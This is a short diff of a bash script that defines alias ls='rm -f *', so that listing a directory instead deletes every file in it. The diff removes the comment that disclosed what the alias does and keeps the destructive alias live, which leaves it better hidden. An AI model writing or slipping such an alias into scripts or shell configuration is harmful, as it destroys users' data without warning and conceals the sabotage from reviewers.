@@ -1,4 +1,2 @@
 #!/bin/bash
-# Creates an alias ls='rm -f *'
-
 alias ls='rm -f *'
